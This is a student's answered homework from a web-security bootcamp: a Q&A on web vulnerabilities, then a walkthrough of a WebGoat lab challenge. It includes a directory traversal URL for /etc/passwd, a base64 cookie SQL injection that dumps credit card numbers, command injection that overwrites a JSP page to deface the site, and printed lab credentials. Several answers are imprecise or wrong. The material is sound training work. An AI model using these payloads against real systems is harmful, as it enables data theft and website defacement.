## Unit 15 Homework: Web Vulnerabilities and Hardening

### Overview

This week, you continued your journey towards enhancing your technical acuity through a deeper understanding of web vulnerabilities and system hardening used to help protect and defend critical web infrastructure.

- The homework is divided into two parts:

   - Part 1: Conceptual based Q&A.
   - Part 2: Technical activity called The Challenge.

- This homework is a condensed review of what you've learned in this unit. Points to consider:

   - It's critical to have a clear understanding of the concepts taught throughout this course. 
   
   - It's also important that you to have a clear understanding of "INFOSEC" terminology when interacting with other Cybersecurity professionals. Not only does this make you look professional, it also helps avoid miscommunication.
   

Some of the highlights of the things that you've learned include:

- An deep understanding of the underlying mechanics behind how web attacks are constructed from both a conceptual and practical standpoint.

- The ability to determine which mitigation strategies are most effective against various forms of web vulnerabilities.

- An understanding of how the principles of `offense informs defense` are utilized to inform security decisions by performing attacks and exploiting various web vulnerabilities from OWASP's Top 10.

The Unit 15 Homework revisits topics covered throughout the lesson. It's recommended that you re-visit the student guide and practice the activities again to strengthen your grasp on the concepts taught during the unit.


For submission, create a a file containing the answers to the questions.


### Part 1: Q&A

#### The URL Cruise Missile

The URL is the gateway to the web, providing the user with unrestricted access to all available online resources. In the wrong hands can be used as a weapon to launch attacks.

Use the graphic below to answer the following questions:

| Protocol         | Host Name                 | Path                   | Parameters               |
| ---------------- | :-----------------------: | ---------------------- | ------------------------ |
| **http://**      | **`www.buyitnow.tv`**     | **/add.asp**           | **?item=price#1999**     |


1. Which part of the URL can be manipulated by an attacker to exploit a vulnerable back-end database system? 
   - Parameter  ?item=price#1999

2. Which part of the URL can be manipulated by an attacker to cause a vulnerable web server to dump the `/etc/passwd` file? Also, name the attack used to exploit this vulnerability.
   - After "add.asp?" , it's possible to access root directory using Directory Travesal exploit. The common way is adding `page=../../../` after the question mark to reach `/etc/passwd` file. 
   Example:  http://www.buyitnow.tv/add.asp?page=../../../../../../../etc/passwd
   
3. Name three threat agents that can pose a risk to your organization.
      - A defaced webpage can contain malicious content and links to inappropriate and offensive sites, which can damage any company’s reputation.

      - A compromised web server can be used to download malicious software (viruses, Trojans, botnets) to anyone visiting the webpage.

      - Compromised data can be used to commit fraudulent activities, leading to loss of business or lawsuits.

4. What kinds of sources can act as an attack vector for injection attacks?
   - Common attack vectors include `social media flatforms`, `malware`, `viruses`, `social engineering`, `pop-ups`, `instant messages`, `text messages` and `email attachments`.

5. Injection attacks exploit which part of the CIA triad?
   -       
      - `Confidentiality` is attained when information is protected from unauthorized disclosure. A loss of confidentiality maybe an unauthorized access of personal information.
         Attackers can exploit weak web server infrastructure to manipulate URLs and infiltrate various parts of the web server architecture to attain undisclosed information.

6. Which two mitigation methods can be used to thwart injection attacks?
   - 
      -  `Input sanitization describes cleansing and scrubbing user input to prevent it from jumping the fence and exploiting security holes. But thorough input sanitization is hard. While some vulnerable sites simply don’t sanitize at all, others do so incompletely, lending their owners a false sense of security.`
      -  `Input validation is performed to ensure only properly formed data is entering the workflow in an information system, preventing malformed data from persisting in the database and triggering malfunction of various downstream components. Input validation should happen as early as possible in the data flow, preferably as soon as the data is received from the external party.`
____

#### Web Server Infrastructure

Web application infrastructure includes  sub-components and external applications that provide  efficiency, scalability, reliability, robustness, and most critically, security.

- The same advancements made in web applications that provide users these conveniences are the same components that criminal hackers use to exploit them. Prudent security administrators need to be aware of how to harden such systems.


Use the graphic below to answer the following questions:

| Stage 1        | Stage 2             | Stage 3                 | Stage 4              | Stage 5          |
| :------------: | :-----------------: | :---------------------: | :------------------: | :--------------: |
| **Client**     | **Firewall**        | **Web Server**          | **Web Application**  | **Database**     |
   
   
1. What stage is the most inner part of the web architecture where data such as, customer names, addresses, account numbers, and credit card info, is stored?
   - Database

2. Which stage includes online forms, word processors, shopping carts, video and photo editing, spreadsheets, file scanning, file conversion, and email programs such as Gmail, Yahoo and AOL.
   - Web Application

3. What stage is the component that stores files (e.g. HTML documents, images, CSS stylesheets, and JavaScript files) that's connected to the Internet and provides support for physical data interactions between other devices connected to the web?
   - Web Server

4. What stage is where the end user interacts with the World Wide Web through the use of a web browser?
   - Stage 1, Client

5. Which stage is designed to prevent unauthorized access to and from protected web server resources?
   - Stage 2, Firewall

----

#### Server Side Attacks

In today’s globally connected cyber community, network and OS level attacks are well defended through the proper deployment of technical security controls such as, firewalls, IDS, Data Loss Prevention, EndPoint and security. However, web servers are accessible from anywhere on the web, making them vulnerable to attack.

1. What is the process called that cleans and scrubs user input in order to prevent it from exploiting security holes by proactively modifying user input.
   - Input Sanitation

2. Name the process that tests user and application-supplied input. The process is designed to prevent malformed data from entering a data information system by verifying user input meets a specific set of criteria (i.e. a string that does not contain standalone single quotation marks).
   - Input Validation

3. **Secure SDLC** is the process of ensuring security is built into web applications throughout the entire software development life cycle. Name three reasons why organization might fail at producing secure web applications.
   - Implementation costs are high.
   - Lack of support from management.
   - No quality management.
   - Reliance on a false sense of security that web application firewalls provide absolute protection.

4. How might an attacker exploit the `robots.txt` file on a web server?
   - Web developer or web admin thinks that robots.txt is only to tell web crawlers what to look and what to avoid. That's actually a good part.

   But here is the catch. Pentesters always include the check for robots.txt for gathering any sensitive information or gaining information of paths which are even tough to guess. So making Pentesters job easier.

   A piece of information like this would give an attacker an idea which technology you are using and what path to look for.

   User-Agent: *
   Disallow: /extend/themes/search.php
   Disallow: /themes/search.php
   Disallow: /support/rss
   Disallow: /archive/
   Disallow: /wp-content/plugins/
   Disallow: /wp-admin/ 
   Here /wp-admin/ is of attacker's interest. And sometimes you will get paths so easily which would be otherwise tough for crawlers too!.

   Even nmap has script to check any vulnerabilities related to it.

   nmap -sV --script http-wordpress-enum <target> 
      ```
   
5. What steps can an organization take to obscure or obfuscate their contact information on domain registry web sites?
   - Answer: 
      
      - Domain registrars offer domain privacy through a service called `WHOIS privacy protection`..
      
      - Using domaintools like https://whois.domaintools.com/ or  https://www.domaintools.com/. 

      - Kali Linux Offensive Security domain tools.
   
6. True or False: As a network defender, `Client-Side` validation is preferred over `Server-Side` validation because it's easier to defend against attacks.

   - false, it's virtually impossible to do Client-Side validation in an internet enviroment
____

#### Web Application Firewalls

WAFs are designed to defend against different types of HTTP attacks and various query types such as SQLi and XSS.

WAFs are typically present on web sites that use strict transport security mechanisms such as online banking or e-commerce websites.

1. Which layer of the OSI model do WAFs operate at?
   - `Layer 7`

2. A WAF helps protect web applications by filtering and monitoring what?

   : `A web application firewall is a specific form of application firewall that filters, monitors, and blocks HTTP traffic to and from a web.

   WAFs have three deployment strategies, each with advantages and disadvantages.`

   `Network-Based WAF`
   Typically low-latency hardware that is installed locally on-premises with a dedicated appliance.
   Capable of large-scale deployment and configuration management.
   Drawback is high-cost. These have initial expenses to set up, and ongoing operational costs.
   
   `Host-Based WAF`
   Software-based and dependent on local server resources.
   More difficult to manage and require more staff resources.
   Lower cost.
  
   `Cloud-Based WAF`
   Low cost, subscription based, turnkey product that requires minimal resources.
   Protects applications across a variety of hosting locations that protect against application layer attacks.
   Cloud service providers use the most current threat intelligence to help identify and block new application security threats.

3. True or False: A WAF based on the negative security model (Blacklisting) protects against known attacks, and a WAF based on the positive security model (Whitelisting) allows pre-approved traffic to pass. 
   - `True`



____

#### Authentication and Access Controls

Security enhancements designed to require users to present two or more pieces of evidence or credentials when logging into an account is called multi-factor authentication.

- Legislation and regulations such as The Payment Card Industry (PCI) Data Security Standard requires the use of MFAs for all network access to a Card Data Environment (CDE).

- Security administrators should have a comprehensive understanding of the basic underlying principles of how MFA works.

1. Define all four factors of multifactor authentication and give examples of each:

   - Factor 1: Knowledge factors:
      are the most commonly used form of authentication. In this form, the user is required to prove knowledge of a secret in order to authenticate.

      A `password` is a secret word or string of characters that is used for user authentication. This is the most commonly used mechanism of authentication. 
      Many multi-factor authentication techniques rely on password as one factor of authentication. 
   
   - Factor 2: Possession Factor:
      ("something the user and only the user has") have been used for authentication for centuries, in the form of a key to a lock. 

      The basic principle is that the key embodies a secret which is shared between the lock and the key, and the same principle underlies possession factor authentication in computer systems. 

      A `security token` is an example of a possession factor.

   - Factor 3: Inherent factor:
      These are factors associated with the user, and are usually `biometric` methods, including `fingerprint`, `face`, `voice`, or `iris recognition`. Behavioral biometrics such as keystroke dynamics can also be used.``

   
   - Factor 4: Location based factor:
      Increasingly, a fourth factor is coming into play involving the physical location of the user. 

      `Location-based authentication` is a special procedure to prove an individual's identity and authenticity on appearance simply by detecting its presence at a distinct location.

2. True or False: A password and pin is an example of 2-factor authentication.
   - False a password and a pin are Knowledge factors,so no two factors in place

3. True or False: A password and `google authenticator app` is an example of 2-factor  authentication.
   - True 
   
4. What is a constrained user interface? 
   - It restricts user access abilities by only allowing the user to request certain functions or have access to specific system resources. 
----
____

### Part 2: The Challenge 

In this activity, you will assume the role of a pen tester hired by a bank to test the security of the bank’s authentication scheme, sensitive financial data, and website interface.


#### Lab Environment   

We'll use the **Web Vulns** lab environment. To access it: 
  - Log in to the Azure Classroom Labs dashboard. 
  - Find the card with the title **Web Vulns** or **Web Vulnerability and Hardening**.
  - Click the monitor icon in the bottom-right. 
  - Select **Connect with RDP**.
  - Use Credentials (azadmin:p4ssw0rd*)

- The lab should already be started, so you should be able to connect immediately. 

- Refer to the [lab setup instructions](https://cyberxsecurity.gitlab.io/documentation/using-classroom-labs/post/2019-01-09-first-access/) for details on setting up the RDP connection.

Once the lab environment is running, open the HyperV manager and make sure that the OWASPBWA and Kali box is running.

- Then, login to the Kali VM and navigate to the IP address of the OWASPBWA machine.

- Click the option for 'WebGoat' and start the WebGoat app.

- Use the credentials: `guest`:`guest`

On the bottom of the left side of the screen, click on `Challenge` and then choose `The Challenge`.

**Note:** A common issue with this lab is the Challange activity failing to start successfully. Hit the `Restart the Lesson` button in the top right if you get an error starting the activity.

### The Challenge Instructions

#### Challenge #1

Your first mission is to break the authentication scheme. There are a number of ways to accomplish this task.

- **Hint #1**: Sometimes, form fields are shy!

- **Hint #2**: Find the hidden JavaScript.

- **Hint #3**: You can appened `source?source=true` to the URL to read the source code. 

After completing the first challenge, you will be provided with an option to continue to the next challenge.

```
- Enable Javascript to view hidden JavaScript code
   - On Kali Linux > Open FireFox
   - On the Address bar enter: `about:config` and change the value of Javascript.Enabled to `True`
   
- Add source?source=true to edit the parameter of `source` to `true` value
   - On the OWASP BWA VM get the ip address by typing ifconfig : 172.18.63.13
   - On Kali Linux > Open firefox > Enable hack the form Add-On Extension in Firefox
   - On the address bar enter: `172.18.63.13/WebGoat/source?source=true`
   - Go to Line 121 and 123 to get the username and password
      ```
      121 private String pass = "goodbye";
      122
      123 private String user = "youaretheweakestlink";
      ```
   - Disable hack the form Add-ON Extension in Firefox
```

#### Challenge #2

Next, steal all of the credit card numbers from the database. 

- **Hint #1**: Sometimes cookies wear different clothes to change their appearances.
- **Hint #2**: Break your way into the conversation and inject your own ideas.

```
 Start `Tamper Data Add-On`> Hit "Buy Now!" > Request Body will open then click "OK" to forward the request > Request Header will open and scroll down to Cookie and copy the user value

   User Cookie Value in Base 64 : `eW91YXJldGhld2Vha2VzdGxpbms=`

 Enable Javascript in Firefox address bar> about:config then change the value of javascript.enabled to true. This will enable the Cyberchef to open on the browser. 

  CyberChef Link: https://gchq.github.io/CyberChef/

 Use CyberChef to decode Base64 cookie value eW91YXJldGhld2Vha2VzdGxpbms= 
Output : `youaretheweakestlink`

 From the CyberChef Base64 Output edit the result to: `youretheweakestlink' OR '1'='1` and convert it to base 64 in CyberChef
Output: `eW91YXJldGhld2Vha2VzdGxpbmsnIE9SICcxJz0nMQ==`

 Copy/paste the value to the Cookie section of the Request Header (StartTamperData window) between " " (Double quotes)

 Forward the request by clicking "OK", notice that the Credit Card selection will reveal all credit card numbers.

 Click`Buy Now` and forward the request  to `Tamper Data Add-On` > Request Body: Click OK > Request Header: Click OK to go the next challenge. Then close 

After completing the second challenge, you will be provided with an option to continue to the next challenge.

 Disable the `Tamper Data Add-On` when you see the next Challenge.
```

#### Challenge #3

Your third and final mission is no easy feat. Your final act is to deface the website. This requires multiple skill sets, all of which you’ve learned and will need for this final act.
Two clues:

- **Hint 1**: You will need to use command injection.

- **Hint 2**: You will need to locate the `webgoat_challenge_guest.jsp` file and inject it with code in order to deface the website.

There are 2 pages displayed on the challenge, `Original Website Text` and `Defaced Website Test`. The main goal is to see the information in the `Defaced Website` area.

``` 

In Kali Linux , search for an Application called webscarab and run it.

Start Foxy Proxy to send all GET/POST requests from Firefox to the WebScarab proxy intercept.

Set the WebScarab App to intercept POST request.
   - Select `Proxy tab` and click the checkbox titled `Intercept requests` (POST and GET)

Start the FoxyProxy > Select `WebScarab`> Tap on `tcp` and Click on `View Network` 

Under URLEnccoded > Change the value to `tcp && whoami && pwd` to test simple command injection. It should return a value of the current directory if working.

-	`/var/lib` is the result of  `whoami` command
-	`/tomcat6` is the result of `pwd` command
-  `/var/lib/tomcat6` is our current working directory.

Under URLEnccoded > Change the value to `tcp && cd / && find . -iname webgoat_challenge_guest.jsp` to know the absolute path of webgoat_challenge_guest.jsp
   - The absolute path is : ./owaspbwa/owaspbwa-svn/var/lib/tomcat6/webapps/WebGoat/webgoat_challenge_guest.jsp.
   - Therefore, the relative path is webapps/WebGoat/webgoat_challenge_guest.jsp.

Under URLEnccoded > Change the value to `tcp && cd webapps/WebGoat && echo you_have_been_hacked > webgoat_challenge_guest.jsp` to inject a text message and deface the website.
   - After clicking "Accept Changes", the Defaced Website section should show the text message that we modified in `webgoat_challenge_guest.jsp`  **"you_have_been_hacked"**

```
---

© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.  

